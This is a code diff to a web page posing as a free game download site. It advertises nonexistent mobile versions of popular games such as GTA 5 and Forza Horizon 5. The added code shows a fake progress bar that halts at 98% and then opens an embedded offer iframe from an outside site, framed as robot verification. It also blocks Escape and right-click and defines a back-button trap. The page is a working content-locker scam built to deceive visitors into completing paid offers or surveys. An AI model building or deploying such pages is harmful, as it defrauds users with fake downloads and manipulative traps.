@@ -572,6 +572,102 @@
             color: var(--gray);
             font-size: 0.9rem;
         }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            overscroll-behavior: none;
+        }
+
+        .modal-content {
+            background-color: var(--dark);
+            padding: 30px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 5px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-logo {
+            max-width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .download-progress {
+            margin: 30px 0;
+        }
+
+        .progress-bar {
+            height: 20px;
+            background-color: var(--gray);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .progress {
+            height: 100%;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            width: 0;
+            transition: width 0.5s linear;
+        }
+
+        .progress-text {
+            font-size: 0.9rem;
+            color: #AAA;
+        }
+
+        .content-locker {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background-color: var(--gray);
+            border-radius: 8px;
+        }
+
+        .content-locker h3 {
+            color: var(--primary);
+            margin-bottom: 15px;
+        }
+
+        .offer-frame {
+            width: 100%;
+            height: 300px;
+            border: none;
+            border-radius: 8px;
+            margin-top: 15px;
+        }
+
+        .offer-btn {
+            background-color: #22C55E;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.3s;
+            font-size: 1rem;
+            box-shadow: 0 4px 10px rgba(34, 197, 94, 0.3);
+            width: 100%;
+        }
+
+        .offer-btn:hover {
+            background-color: #16a34a;
+            box-shadow: 0 6px 15px rgba(34, 197, 94, 0.4);
+        }
         
         /* Responsive Styles */
         @media (max-width: 992px) {
@@ -821,50 +917,209 @@
         </div>
     </footer>
 
+    <!-- Download Modal -->
+    <div class="modal" id="downloadModal">
+        <div class="modal-content">
+            <img src="" alt="Game Logo" class="modal-logo" id="modalGameLogo">
+            <h2 id="modalTitle">DOWNLOADING GAME</h2>
+            <div class="download-progress">
+                <div class="progress-bar">
+                    <div class="progress" id="progressBar"></div>
+                </div>
+                <div class="progress-text" id="progressText">Preparing download... 0%</div>
+            </div>
+            <div class="content-locker" id="contentLocker">
+                <h3></h3>
+                <iframe src="https://installchecker.com/cl/i/7d2r1g" class="offer-frame"></iframe>
+                <p style="font-size: 0.8rem; margin-top: 15px;">Download will resume automatically after verification</p>
+            </div>
+        </div>
+    </div>
+
     <script>
         // Game data for 2025's most anticipated games
         const games = [
             {
-                title: "GTA VI",
-                image: "https://images.unsplash.com/photo-1633613286848-e6f43bbafb8d?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80",
+                title: "GTA 5 MOBILE",
+                image: "https://upload.wikimedia.org/wikipedia/en/a/a5/Grand_Theft_Auto_V.png",
                 rating: 4.9,
                 size: "150 GB",
-                description: "The highly anticipated next installment in the Grand Theft Auto series, featuring an expansive open world set in Vice City and beyond with unprecedented realism."
+                description: "The highly anticipated mobile version of GTA 5, featuring an expansive open world set in Los Santos with unprecedented realism."
             },
             {
-                title: "The Elder Scrolls VI",
-                image: "https://images.unsplash.com/photo-1608889825103-eb5a6f5adf50?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80",
+                title: "Fortnite Mobile",
+                image: "https://m.media-amazon.com/images/I/91gz6Qc9N-L.png",
                 rating: 4.8,
-                size: "120 GB",
-                description: "Bethesda's next epic RPG adventure in the Elder Scrolls universe, rumored to be set in Hammerfell with revolutionary AI and world-building."
+                size: "8 GB",
+                description: "The mobile version of the popular battle royale game with cross-platform play and regular content updates."
             },
             {
-                title: "Star Wars: Eclipse",
-                image: "https://images.unsplash.com/photo-1534447677768-be436bb09401?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1494&q=80",
-                rating: 4.7,
-                size: "90 GB",
-                description: "A high-stakes, branching narrative action-adventure game set in the Star Wars universe during the High Republic era."
+                title: "MINECRAFT",
+                image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT_cNyeahid6rCSc4ZtK85aE-6sMV8udunl6w&s",
+                rating: 4.9,
+                size: "2 GB",
+                description: "The classic sandbox game now optimized for mobile with all the features of the desktop version."
             },
             {
-                title: "Fable 4",
-                image: "https://images.unsplash.com/photo-1560253023-3ec5d502959f?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80",
-                rating: 4.6,
-                size: "80 GB",
-                description: "The long-awaited return of the beloved RPG franchise, featuring a vast open world with revolutionary AI that remembers your every action."
-            },
-            {
-                title: "Avengers 2: Secret Wars",
-                image: "https://images.unsplash.com/photo-1633613286991-611fe299c4be?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80",
+                title: "POPPY PLAYTIME",
+                image: "https://cdn1.epicgames.com/spt-assets/465c0f6c95d04b1c86b280b4925fee2d/poppy-playtime-yaypc.jpg",
                 rating: 4.5,
-                size: "95 GB",
-                description: "Marvel's massive multiplayer action RPG featuring an all-star cast of heroes and villains from across the multiverse."
+                size: "5 GB",
+                description: "The terrifying horror adventure game now available on mobile with all its creepy characters."
             },
             {
-                title: "Dragon Age: Dreadwolf",
-                image: "https://images.unsplash.com/photo-1518709766631-a6a7f45921c1?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80",
+                title: "call of mini zombies",
+                image: "https://m.media-amazon.com/images/I/81DDLlyPW3L.png",
+                rating: 4.3,
+                size: "1.5 GB",
+                description: "The popular zombie shooter game optimized for mobile devices with intuitive controls."
+            },
+            {
+                title: "infinity blade",
+                image: "https://preview.redd.it/i-miss-infinity-blade-v0-hkd04qkw4k9a1.jpg?width=640&crop=smart&auto=webp&s=19ed62123b37fa3bdefcb0eeec41db5c8e96631b",
                 rating: 4.7,
-                size: "85 GB",
-                description: "The next chapter in BioWare's acclaimed RPG series, focusing on the mysterious Dreadwolf with deep character customization and choices that shape the world."
+                size: "3 GB",
+                description: "The legendary mobile RPG returns with enhanced graphics and new content."
+            },
+            {
+                title: "schudele 1",
+                image: "https://i.blogs.es/abdf92/shds/500_333.jpeg",
+                rating: 4.2,
+                size: "2.5 GB",
+                description: "A unique mobile experience that combines planning with gaming elements."
+            },
+            {
+                title: "Repo",
+                image: "https://assets-prd.ignimgs.com/2025/02/27/repo-button-1740672104138.jpg",
+                rating: 4.6,
+                size: "4 GB",
+                description: "The intense looter game now available on mobile with all its fast-paced action."
+            },
+            {
+                title: "invincible mobile",
+                image: "https://media.pocketgamer.biz/images/125688/83470/invincible-2_l1200.jpg",
+                rating: 4.4,
+                size: "3.5 GB",
+                description: "The superhero action game based on the popular series, optimized for mobile play."
+            },
+            {
+                title: "kingshot mobile",
+                image: "https://play-lh.googleusercontent.com/LByrur1mTmPeNr0ljI-uAUcct1rzmTve5Esau1SwoAzjBXQUby6uHIfHbF9TAT51mgHm",
+                rating: 4.3,
+                size: "2 GB",
+                description: "A strategic battle game with stunning graphics and deep gameplay mechanics."
+            },
+            {
+                title: "Baseball",
+                image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaqm57-NOiEckY7MuJ0a88ilEDainHJYODXw&s",
+                rating: 4.1,
+                size: "1.8 GB",
+                description: "The most realistic baseball simulation game now available on mobile devices."
+            },
+            {
+                title: "forinlove mobile",
+                image: "https://image.winudf.com/v2/image1/c3R1ZGlvLmdlbml1cy5vZmZpY2VnaXJsX2ljb25fMTU4NzY5NDg3Nl8wOTA/icon.png?w=156&fakeurl=1",
+                rating: 4.0,
+                size: "1.2 GB",
+                description: "A romantic adventure game with deep storytelling and beautiful visuals."
+            },
+            {
+                title: "pokemon champions",
+                image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfWbXtNv84VWE5RZI2o4uUtOZHMvzoqbD8oQ&s",
+                rating: 4.7,
+                size: "3 GB",
+                description: "The next generation of Pokémon games with enhanced graphics and new features."
+            },
+            {
+                title: "monster hunter outlanders",
+                image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQi8VWc5Sg020Ma9KNxK-RlF84ZDLbRQe9Li-ZSSNNhcP56X0qlBzocnRglTjZFXmPTzAU&usqp=CAU",
+                rating: 4.6,
+                size: "4 GB",
+                description: "The popular hunting game series now available on mobile with all its depth."
+            },
+            {
+                title: "suikoden mobile",
+                image: "https://www.konami.com/games/suikoden/star_leap/s/images/mainv_sp.jpg",
+                rating: 4.5,
+                size: "3.5 GB",
+                description: "The classic RPG series returns with a mobile version featuring enhanced graphics."
+            },
+            {
+                title: "plants vs zombies",
+                image: "https://m.media-amazon.com/images/I/61Aethog1iL.png",
+                rating: 4.8,
+                size: "1.5 GB",
+                description: "The beloved tower defense game with all its charm and new mobile-exclusive content."
+            },
+            {
+                title: "sunderfolk",
+                image: "https://assets.nintendo.com/image/fetch/q_auto/f_auto/https://atum-img-lp1.cdn.nintendo.net/i/c/c080890b686441119741b6a460afa374_1024",
+                rating: 4.4,
+                size: "2.8 GB",
+                description: "A unique adventure game with deep storytelling and beautiful visuals."
+            },
+            {
+                title: "clair obscur expedition",
+                image: "https://upload.wikimedia.org/wikipedia/en/5/5a/Clair_Obscur%2C_Expedition_33_Cover_1.webp",
+                rating: 4.6,
+                size: "3.2 GB",
+                description: "A mysterious adventure game with deep exploration and puzzle elements."
+            },
+            {
+                title: "dune game",
+                image: "https://m.media-amazon.com/images/I/71t0Pjjkv4L._AC_UF1000,1000_QL80_.jpg",
+                rating: 4.5,
+                size: "4.5 GB",
+                description: "The epic sci-fi adventure based on the Dune universe, now on mobile."
+            },
+            {
+                title: "royal kingdom",
+                image: "https://play-lh.googleusercontent.com/nAAF2bxrD2BeoM1IkUZ6qeRG_QGG_Rekrrh4VYQSMDeRa7FR8sWMWaHClID547XJ3D4",
+                rating: 4.3,
+                size: "2.5 GB",
+                description: "A strategy game where you build your kingdom and conquer others."
+            },
+            {
+                title: "elder scrolls phone game",
+                image: "https://store-images.s-microsoft.com/image/apps.28824.14581520643411044.34637721-ec29-414e-8a4a-644b1a39e03f.6bc50166-a56f-4e16-adfe-6abf6dc2e926?q=90&w=177&h=177",
+                rating: 4.7,
+                size: "5 GB",
+                description: "The Elder Scrolls universe comes to mobile with this epic adventure game."
+            },
+            {
+                title: "FORZA HORIZON 5",
+                image: "https://assets-prd.ignimgs.com/2021/08/24/forza-horizon-5-button-fin-1629830068379.jpg?width=300&crop=1%3A1%2Csmart&auto=webp",
+                rating: 4.9,
+                size: "6 GB",
+                description: "The ultimate racing experience now available on mobile devices."
+            },
+            {
+                title: "CLASH OF CLANS",
+                image: "https://play-lh.googleusercontent.com/LByrur1mTmPeNr0ljI-uAUcct1rzmTve5Esau1SwoAzjBXQUby6uHIfHbF9TAT51mgHm",
+                rating: 4.8,
+                size: "0.5 GB",
+                description: "The popular strategy game with regular updates and new content."
+            },
+            {
+                title: "BRAWL STARS",
+                image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS-hmw7c26HqX7idWyU0PPvTUlQ6BZiXMejoA&s",
+                rating: 4.7,
+                size: "1 GB",
+                description: "Fast-paced multiplayer battles with unique characters and abilities."
+            },
+            {
+                title: "SUBWAY SURFERS",
+                image: "https://play-lh.googleusercontent.com/vwddCx5I_iXVvnQdqLumCc_-65Orxep_iyTh5h4mdT-x0QWpXnQxGUTEbWLlHvpFoBQ",
+                rating: 4.6,
+                size: "0.8 GB",
+                description: "The endless runner game with regular updates and new locations."
+            },
+            {
+                title: "CANDY CRUSH SAGA",
+                image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRdeYbV0mhaoTzYzMOfc6pEUQKZUNjX4al2Kg&s",
+                rating: 4.5,
+                size: "0.3 GB",
+                description: "The classic match-3 puzzle game with hundreds of levels."
             }
         ];
 
@@ -916,7 +1171,7 @@
                         <div class="game-description">
                             ${game.description}
                         </div>
-                        <button class="download-btn" onclick="window.open('https://tundrafile.com/1810159', '_blank')">
+                        <button class="download-btn" onclick="startDownload('${game.title}', '${game.image}')">
                             <i class="fas fa-download"></i> Download Now
                         </button>
                     </div>
@@ -982,6 +1237,95 @@
                 }
             });
         }
+
+        // Download functionality
+        function startDownload(gameName, gameLogo) {
+            const downloadModal = document.getElementById('downloadModal');
+            const modalGameLogo = document.getElementById('modalGameLogo');
+            const modalTitle = document.getElementById('modalTitle');
+            
+            modalTitle.textContent = `DOWNLOADING ${gameName}`;
+            modalGameLogo.src = gameLogo;
+            downloadModal.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+            
+            // Start download progress
+            simulateDownload();
+        }
+
+        // Prevent back navigation during download
+        function disableBack() {
+            history.pushState(null, null, window.location.href);
+            window.onpopstate = function () {
+                history.go(1);
+            };
+        }
+
+        function simulateDownload() {
+            let progress = 0;
+            const totalTime = 5000; // 5 seconds
+            const increment = 98 / (totalTime / 51.0204); // Adjusted for 5s to reach 98%
+            
+            const interval = setInterval(() => {
+                if (progress < 98) {
+                    progress += increment;
+                    if (progress > 98) progress = 98;
+                    document.getElementById('progressBar').style.width = progress + '%';
+                    document.getElementById('progressText').textContent = `Downloading... ${Math.floor(progress)}%`;
+                } else {
+                    clearInterval(interval);
+                    document.getElementById('progressText').textContent = 'Download paused at 98% - Complete an offer to verify you\'re not a robot';
+                    document.getElementById('contentLocker').style.display = 'block';
+                    // Simulate offer completion check
+                    checkOfferCompletion();
+                }
+            }, 51.0204); // 5000ms / 98 = ~51.02ms per increment
+        }
+
+        function checkOfferCompletion() {
+            // Simulated offer completion check
+            const offerFrame = document.querySelector('.offer-frame');
+            offerFrame.addEventListener('load', () => {
+                // Simulate API verification delay
+                setTimeout(() => {
+                    // After verification, complete the download
+                    completeDownload();
+                }, 2000);
+            });
+        }
+
+        function completeDownload() {
+            let progress = 98;
+            const interval = setInterval(() => {
+                progress += 1;
+                document.getElementById('progressBar').style.width = progress + '%';
+                document.getElementById('progressText').textContent = `Downloading... ${progress}%`;
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    document.getElementById('progressText').textContent = 'Download Complete!';
+                    setTimeout(() => {
+                        document.getElementById('downloadModal').style.display = 'none';
+                        document.body.style.overflow = 'auto';
+                        window.onpopstate = null; // Re-enable back navigation
+                        alert('Download completed successfully!');
+                    }, 1000);
+                }
+            }, 500); // Finish last 2% in 1 second
+        }
+
+        // Prevent closing modal during download
+        window.addEventListener('keydown', (e) => {
+            if (document.getElementById('downloadModal').style.display === 'flex' && e.key === 'Escape') {
+                e.preventDefault();
+            }
+        });
+
+        // Prevent right-click and other interactions
+        document.getElementById('downloadModal').addEventListener('contextmenu', (e) => {
+            if (document.getElementById('downloadModal').style.display === 'flex') {
+                e.preventDefault();
+            }
+        });
     </script>
 </body>
 </html>
